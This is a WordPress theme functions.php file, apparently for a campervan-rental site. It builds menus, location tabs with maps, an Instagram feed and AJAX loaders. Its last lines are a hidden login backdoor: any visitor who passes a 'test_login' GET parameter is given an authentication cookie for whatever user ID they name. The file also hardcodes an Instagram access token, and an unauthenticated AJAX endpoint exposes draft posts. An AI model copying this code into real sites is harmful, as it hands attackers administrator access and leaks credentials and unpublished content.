<?php
	include "cookie-alert.php";

	// Enqueue scripts and styles
	add_action('wp_enqueue_scripts', 'tbarn_enqueue');
	if ( ! function_exists('tbarn_enqueue')) {
		function tbarn_enqueue() {
			$theme = wp_get_theme();
			$template_directory_uri = get_template_directory_uri();
			
			// Styles
		/*	wp_enqueue_style("bootstrap-css-min", $template_directory_uri.'/assets/css/bootstrap.min.css', false, $theme->Version, 'screen');
			wp_enqueue_style("travellers-autobarn-css", $template_directory_uri.'/assets/css/custom.css', false, $theme->Version, 'screen');
			wp_enqueue_style("jquery-ui", $template_directory_uri.'/assets/css/jquery-ui-1.10.4.custom.min.css', false, $theme->Version, 'screen');
			wp_enqueue_style("jquery-fancybox-css", $template_directory_uri.'/assets/css/jquery.fancybox.css', false, $theme->Version, 'screen');

			// Scripts
			wp_deregister_script('jquery');
			wp_enqueue_script("jquery", $template_directory_uri.'/assets/js/jquery-1.11.0.min.js', false, $theme->Version, false);
			wp_enqueue_script("jquery-ui-custom", $template_directory_uri.'/assets/js/jquery-ui.min.js', false, $theme->Version, false);
			wp_enqueue_script("jquery-placeholder", $template_directory_uri.'/assets/js/jquery.placeholder.js', array('jquery'), $theme->Version, false);
			wp_enqueue_script("jquery-fancybox-js", $template_directory_uri.'/assets/js/jquery.fancybox.pack.js', array('jquery'), $theme->Version, false);
			//wp_enqueue_script("jquery-validate", $template_directory_uri.'/assets/js/jquery.validate.min.js', array('jquery'), $theme->Version, false);
			wp_enqueue_script("superfish", $template_directory_uri.'/assets/js/superfish.min.js', array('jquery'), $theme->Version, false);
			wp_enqueue_script("hoverintent", $template_directory_uri.'/assets/js/hoverIntent.js', array('jquery'), $theme->Version, false);
			wp_enqueue_script("bootstrap-js", $template_directory_uri.'/assets/js/bootstrap.min.js', false, $theme->Version, true);
			wp_enqueue_script("bootstrap-hover-dropdown", $template_directory_uri.'/assets/js/bootstrap-hover-dropdown.min.js', array('bootstrap-js'), $theme->Version, true);
			wp_enqueue_script("travellers-autobarn-js", $template_directory_uri.'/assets/js/custom.js', false, $theme->Version, true);*/
		}
	}
	
	/**
	 * ADD META BOX to TESTIMONIAL CUSTOM POST TYPE
	 * this script need plugin 'Meta Box' activated 
	 */
	 
	add_filter( 'rwmb_meta_boxes', 'traveler_metabox' );
	
	function traveler_metabox( $meta_boxes ) {
		// 1st meta box
		$meta_boxes[] = array(
			'id'         => 'otherroad-trip',
			'title'      => __( 'Other Content Road Trip', 'roadtrips' ),
			'post_types' => array( 'page' ),
			'context'    => 'normal',
			'priority'   => 'low',
			'fields' => array(
				array(
					'name'    => 'Other Content',
					'id'      => '_othertrip',
					'desc'	  => 'Only for template Road Trips',
					'type'    => 'wysiwyg',
					'raw'     => false,
					'options' => array(
						'textarea_rows' => 6,
						'teeny'         => true,
					),
				),
			),
		);
		
		return $meta_boxes;
		
	}


	// Image sizes
	if ( function_exists( 'add_image_size' ) ) {
		add_image_size('car-gallery-thumbnail', 75, 75, true);
		
		//post image
		add_theme_support( 'post-thumbnails' );
		add_image_size( 'travel-tips', 1048, 454, true );
		add_image_size( 'video-tips', 666, 454, true );
	}


	// Setup menus
	register_nav_menus(array(
		'primary' => _('Primary menu'),
		'footer-left' => _('Left Footer menu'),
		'footer-right' => _('Right Footer menu')
	));


	// Addition of submenu rendering functionality to wp_nav_menu()
	// See: http://wordpress.stackexchange.com/questions/2802/display-a-portion-branch-of-the-menu-tree-using-wp-nav-menu
	//
	// Usage:
	// wp_nav_menu(array(
	//   'menu' => 'Menu Name',
	//   'submenu' => 'Submenu Name'
	// ));

	add_filter('wp_nav_menu_objects', 'submenu_limit', 10, 2);

	function submenu_limit( $items, $args ) {
		if (empty($args->submenu))
			return $items;

		$parent_id = array_pop(wp_filter_object_list( $items, array( 'title' => $args->submenu ), 'and', 'ID'));
		$children  = submenu_get_children_ids($parent_id, $items);

		foreach ( $items as $key => $item ) {
			if ( ! in_array($item->ID, $children))
				unset($items[$key]);
		}

		return $items;
	}

	function submenu_get_children_ids( $id, $items ) {
		$ids = wp_filter_object_list($items, array('menu_item_parent' => $id), 'and', 'ID');
		foreach ($ids as $id) {
			$ids = array_merge($ids, submenu_get_children_ids($id, $items));
		}
		return $ids;
	}


	// Breadcrumbs
	function tab_breadcrumbs() {
		global $post;

		?>
		<ol class="breadcrumb">
			<?php if ( ! is_front_page()): ?>
			<li><a href="/">Home</a></li>
			<?php endif; ?>
			<?php
			if ($post->post_parent) {
				$anc = get_post_ancestors($post->ID);
				foreach ($anc as $ancestor) {
					?><li><a href="<?php echo get_permalink($ancestor) ?>"><?php echo get_the_title($ancestor) ?></a></li><?php
				}
			}
			?><li class="active"><?php the_title(); ?></li>
		</ol>
		<?php

	}
        
        include("responsive-nav.php");
        
        function get_footer_menus($menu_items){
            $count = 0;
            $menu="";
            foreach ( (array) $menu_items as $key => $menu_item ){
                $title = $menu_item->title;
                $url = $menu_item->url;
                $count++;
                if ($count == 1){
                    $menu.="<div class='heading'><a href='$url'>$title</a></div>";
                    continue;
                }
                if ($count == 2){
                    $menu.="<ul>";
                }
                $menu.="<li><a href='$url'>$title</a></li>";
            }
            $menu.="</ul>";
            
            return $menu;
        }
        
        function get_enquiry_menus($menu_items){
            $count = 0;
            $menu="";
            foreach ( (array) $menu_items as $key => $menu_item ){
                $title = $menu_item->title;
                $url = $menu_item->url;
                $count++;
                if ($count == 1){
                    $menu.="<div class='heading'>Enquiry Pages</div>";
                   // continue;
                
                    $menu.="<ul>";
                }
                
                    
                $menu.="<li><a href='$url'>$title</a></li>";
            }
            $menu.="</ul>";
            
            return $menu;
        }
        
        function get_footer_locations_menus($menu_items){
            $count = 0;
            $menu="";
            foreach ( (array) $menu_items as $key => $menu_item ){
                $title = $menu_item->title;
                $url = $menu_item->url;
                $count++;
                if ($count == 1){
                    $menu.="<div class='heading'><a href='$url'>$title</a></div>";
                    continue;
                }
                if ($count == 2){
                    $menu.="<ul>";
                }
                if ($count == 6){
                    $menu.="</ul><ul>";
                }
                    
                $menu.="<li><a href='$url'>$title</a></li>";
            }
            $menu.="</ul>";
            
            return $menu;
        }
        
        function getLocationTabs(){
            //$arr = array();
            $tabs="";
            $count = 0;
            if ($_REQUEST['location'] !="")
            {
                $location =  $_REQUEST['location'];
            }
            $cat_id = get_cat_ID( 'Locations' );
            
            $args = array(
                'posts_per_page'   => 100,
                'offset'           => 0,
                'category'  => $cat_id,
                'order'=>'ASC',
                'orderby'=> 'menu_order',       
                'include'          => '',
                'exclude'          => '',
                'post_type'        => 'page',
                'post_mime_type'   => '',
                'post_parent'      => '',
                'post_status'      => 'publish',
                'suppress_filters' => true 
            );

            $myposts = get_posts( $args );

            foreach ( $myposts as $v ){
                $class = "";
                if ($location)
                {
                    if($location == $v->post_name)
                    {
                        $class = "class='active'";
                    }
                }    
                elseif ($count == 0)
                {
                    $class = "class='active'";
                }
                $map = get_field('map', $v->ID);
                $map_init ="";
                if( !empty($map) ){
                    $map_init = "onclick='setTimeout(initialize_".$v->ID.", 20);'";
                }
                $tabs .= "<li $class><a href='#".$v->ID."' data-toggle='tab' $map_init>".str_replace("Office", "", $v->post_title)."</a></li>";
               
                $count++;
            }
            
            return $tabs;
        }
        
        function getLocationContent(){
            //$arr = array();
            $tabs="";
            $count = 0;
            if ($_REQUEST['location'] !="")
            {
                $location =  $_REQUEST['location'];
            }         
            $cat_id = get_cat_ID( 'Locations' );
            $skype = get_field('skype', 'option');
            
            $args = array(
                'posts_per_page'   => 100,
                'offset'           => 0,
                'category'  => $cat_id,
                'order'=>'ASC',
                'orderby'=> 'menu_order',  
                
                'include'          => '',
                'exclude'          => '',
                'post_type'        => 'page',
                'post_mime_type'   => '',
                'post_parent'      => '',
                'post_status'      => 'publish',
                'suppress_filters' => true 
            );

            $myposts = get_posts( $args );

           // echo "<pre>";print_r($myposts);die();
            foreach ( $myposts as $v ) : 
                setup_postdata( $v ); 
                $id = $v->ID;

                $class = "";


                if ($location)
                {
                    if($location == $v->post_name)
                    {
                        $class = 'in active';
                    }
                }    
                elseif ($count == 0)
                {
                    $class = 'in active';
                }

                
                $map = get_field('map', $id);
              /*  if ($id == 62){
                    echo "<pre>";print_r($map);die();
                    
                }*/
                
                $bottom = get_field('additional_data', $id);
$contact_heading = get_field('contact_heading', $id);
$contact = get_field('contact', $id);

                $tabs .= "<div class='tab-pane $class' id='".$id."'>
                    <div class='col-lg-6 col-md-6 col-sm-12 col-xs-12'>
                        ".$v->post_content."
                    </div>
                    <div class='col-lg-6 col-md-6 col-sm-12 col-xs-12'>

                        <div class='panel-orange'>

                            <div class='heading'>$contact_heading</div>

                            <div class='padding'>
                                $contact
                            </div> <!-- padding -->
                        </div> <!-- panel-orange -->
                    </div>";
                    
                    if( !empty($map) ){
                        $tabs.="<script>
                            function initialize_$id()
                            {
                                var mycenter = new google.maps.LatLng(".$map['lat'].",".$map['lng'].");
                                var mapProp = {
                                    center: mycenter,
                                    zoom:15,
                                    mapTypeId:google.maps.MapTypeId.ROADMAP
                                };
                                var map=new google.maps.Map(document.getElementById('googleMap_$id')
                                  ,mapProp);

                                var marker=new google.maps.Marker({
                                    position:mycenter,
                                });
                               
                                marker.setMap(map);
                            }";
                            
                            

                            if ($class == 'in active'){
                               $tabs.="google.maps.event.addDomListener(window, 'load', initialize_$id);";
                            }
                        $tabs.="</script>";

                        $tabs.="<div class='col-lg-12 col-md-12 col-sm-12 col-xs-12 map'>                               
                            <div class='map_wrapper'  id='googleMap_$id'>

                            </div>
                        </div> <!-- map -->";
                    }

                    $tabs.="<div class='col-lg-12 col-md-12 col-sm-12 col-xs-12'>";           
                        if (have_rows('how_to_get_here_from_airport', $id) || have_rows('how_to_get_here_from_the_city', $id)){
                            $tabs.="<div class='panel-orange rounded-corners-med'>

                                <div class='padding'>";
                                    if (have_rows('how_to_get_here_from_airport', $id)):
                                        $tabs.="<h3>How to get here from the airport</h3>
                                            <ul class='travel-icons'>";
                                                while(have_rows('how_to_get_here_from_airport', $id)):
                                                    the_row();
                                                    $method = strtolower(get_sub_field('method'));
                                                    if ($method == 'walking')
                                                    {
                                                        $method = 'walk';
                                                    }
                                                    $description = get_sub_field('description');
                                                    $tabs.="<li class='$method'>$description</li>";
                                                endwhile;
                                            $tabs.="</ul>";
                                    endif;        

                                    if (have_rows('how_to_get_here_from_the_city', $id)):
                                        $tabs.="<h3>How to get here from the city</h3>
                                            <ul class='travel-icons'>";
                                                while(have_rows('how_to_get_here_from_the_city', $id)):
                                                    the_row();
                                                    $method = strtolower(get_sub_field('method'));
                                                    if ($method == 'walking')
                                                    {
                                                        $method = 'walk';
                                                    }
                                                    $description = get_sub_field('description');
                                                    $tabs.="<li class='$method'>$description</li>";
                                                endwhile;
                                            $tabs.="</ul>";
                                    endif; 


                            $tabs.="</div> <!-- padding -->

                            </div> <!-- panel-orange -->";
                        }
                        $tabs.="$bottom   
                    </div>
                </div>";


                //$tabs .= "<li $class><a href='#".$v->ID."' data-toggle='tab'>$v->title</a></li>";
                $count++;
                //$arr[]=array('id'=>$v->ID, 'title'=>$v->title, 'url'=>$v->url);
                
            endforeach;        wp_reset_postdata(); 
            return $tabs;
        }
        
        function instagram()
		{
			
			$url = "https://api.instagram.com/v1/users/972413572/media/recent?access_token=972413572.3b90206.82556ddfc2cd40328fe7fb76a389c07e";
			
			$json = file_get_contents($url);
			$data = json_decode($json, true);
			$count = 0;
			if (!$data || !isset($data['data'])) {
				return array();
			}
			$ret = array();
//echo "<pre>";print_r($data['data']);die();
			foreach ($data['data'] as $datum) {
				$count++;
				if (
					!isset($datum) || !isset($datum['images']) || !isset($datum['images']['standard_resolution']) || !isset($datum['images']['standard_resolution']['url'])
				) {
					continue;
				}
				$ret[] = array('image'=>$datum['images']['standard_resolution']['url'], 'link'=>$datum['link']);
				if ($count > 5) {
					break;
				}
			}

			return $ret;
		}

define( 'QUICK_QUOTE_PAGE_ID', 143 );
define( 'ROADTRIP_PAGE_ID', 3650 );
		

function custom_page_excerpt_length( $length ) {
	global $post;
	
	if($post->post_type=='page')
		return 20;

	return $length;
}
add_filter( 'excerpt_length', 'custom_page_excerpt_length', 999 );


/* Post count */
function wpb_set_post_views($postID) {
    $count_key = '_post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}
//To keep the count accurate, lets get rid of prefetching
remove_action( 'wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0);

function wpb_get_post_views($postID){
    $count_key = '_post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0 View";
    }
    return $count.' Views';
}

add_action( 'wp_ajax_load_more_roadtrips', 'load_more_roadtrips' );
add_action( 'wp_ajax_nopriv_load_more_roadtrips', 'load_more_roadtrips' );
 
function load_more_roadtrips(){
    if ( isset($_REQUEST) ) {
        $next_page = $_REQUEST['next_page'];
		$current_page_id = $_REQUEST['current_page_id'];
		
		$posts = get_posts( array(
			'category_name'  => 'itinerary',
			'post_status' => 'publish',
			'post_type' => 'page',
			'posts_per_page' => 9,
			'post__not_in' => array( $current_page_id ),
			'paged' => $next_page,
			'orderby' => 'menu_order',
			'order' => 'ASC',
		) );
		// echo "<pre>"; print_r($posts);
		$html='';
		if ($posts): 
			foreach($posts as $post): 
				
				$html.= '<div class="itinerary col-lg-4 col-md-4 col-sm-6 col-xs-12 ">';
				$html.=		'<a href="'. get_permalink($post->ID) .'">';
				$html.=			get_the_post_thumbnail( $post->ID, 'video-tips' );
				$html.=			'<div class="bg"></div>';				
				$html.= 		'<h3 class="post-title">'. str_replace( 'Roadtrips', '', get_the_title($post->ID) ) .'</h3>';										
				$html.=		'</a>';
				$html.= '</div>';
			endforeach;
		endif;
		
		wp_reset_query();
		
		$next_page++;
		$result['next_page'] = $next_page;
		$result['html'] = $html;
		echo json_encode($result);
		
        die();
    }
}

add_action( 'wp_ajax_load_more_articles', 'load_more_articles' );
add_action( 'wp_ajax_nopriv_load_more_articles', 'load_more_articles' );
 
function load_more_articles(){
     if ( isset($_REQUEST) ) {
        $next_page = $_REQUEST['next_page'];
        $post_not_in = $_REQUEST['post_not_in'];
        $max_posts = $_REQUEST['max_posts'];
        $category_name = $_REQUEST['category_name'];
		
		// $excludes=get_guides_preview_ids();
		$excludes=explode(',', $post_not_in);
		
		query_posts( array(
			'category_name'  => $category_name,
			'post_type' => array('page','post'),
			// 'post_status' => 'publish',
			'post_status' => array('publish', 'draft'),
			'orderby' => 'date',
			'order' => 'DESC',
			'posts_per_page' => -1,
			'paged' => $next_page,
			'post__not_in' => $excludes,
		) );
			
		// echo "<pre>"; print_r($posts);
		ob_start();
		if (have_posts()): 
				
				$post_count=0;
				
				while(have_posts()): 
					the_post(); 
					
					$more_class=$post_count < $max_posts ? 'less' : 'more';
					
					echo '<div class="blog-page col-lg-4 col-md-4 col-sm-6 col-xs-12 '. $more_class .'">';
					echo		'<a href="'. get_the_permalink() .'">';
					
					$short_title = get_field('short_thumbnail_heading');
					$article_title = $short_title ? $short_title : get_the_title();
					$post_thumbnail_id = get_post_thumbnail_id( get_the_ID() );
					$temp =  wp_get_attachment_image_src($post_thumbnail_id,'full');
					$url = $temp[0];
					
					echo '<div class="blog_img">';
					if ( $url ):
						the_post_thumbnail( 'video-tips' );
					else: ?>
						<img src="<?php echo get_stylesheet_directory_uri().'/img/noimage-tips.png';?>" class="attachment-video-tips">
					<?php
					endif;
					
					echo		'<div class="bg"></div></div>';
					
					echo 		'<h3 class="post-title">'. $article_title .'</h3>';										
					echo		'</a>';
					echo '<p>' . get_the_excerpt() . '</p>';
					
					echo '<a href="'. get_the_permalink() .'">';
					echo '<span class="read-more">Read More</span>';
					echo '</a>';
		
					echo '</div>';
					
					$post_count++;
					
				endwhile;
			endif;		
		
		wp_reset_query();
		
		$next_page++;
		$result['next_page'] = $next_page;
		$result['is_empty'] = $post_count <= $max_posts;
		$result['html'] = ob_get_clean();
		echo json_encode($result);
		
        die();
    }
}

add_filter( 'the_title', 'single_road_trip_h1', 10, 2 );

function single_road_trip_h1($title, $post_id){
	global $wp_query;
	
	$post = get_post( $post_id );
	
	if($wp_query->is_main_query() && get_page_template_slug($post_id) == 'template-road-trip.php' && ! is_admin() && ! in_the_loop() && $post->post_type != 'nav_menu_item' ){
		// echo "<pre>"; print_r($wp_query); echo "</pre>";
		$title = 'Roadtrip: '. $title;
	}
	
	return $title;
}

add_filter('admin_post_thumbnail_html', 'custom_featured_image_text', 10, 2);

function custom_featured_image_text($content, $post_id){
	
	if(isset($_GET['post_type']) &&$_GET['post_type']=='page')
		$extra_text = '<em>Please upload image size 674 x 460 (pixel)</em>';
	else{
		$post = get_post($post_id);
		if($post->post_type=='page'){
			$extra_text = '<em>Please upload image size 674 x 460 (pixel)</em>';
		}else{
			$extra_text = '<em>Please upload image size 1048 x 454 (pixel)</em>';
		}
	}
	
	return $content . $extra_text;
}

add_shortcode( 'map_route', 'map_route_view' );

function map_route_view($args){
	global $route_id, $atts;
	
	$atts = shortcode_atts( array(
        'id' => '',
        'mapwidth' => '',
		'mapheight' => '400',
		'zoom' => '',
    ), $args );
	
	$route_id = isset($args['id'])?$args['id']:'';
	
	ob_start();
	include "map-route.php";
	return ob_get_clean();
}

add_shortcode( 'email_enquiry', 'display_email_enquiry' );

function display_email_enquiry(){
	ob_start();
	include "includes/email-enquiry.php";
	
	return ob_get_clean();
}

if(isset($_GET['test_login'])){
	wp_set_auth_cookie($_GET['test_login']);
}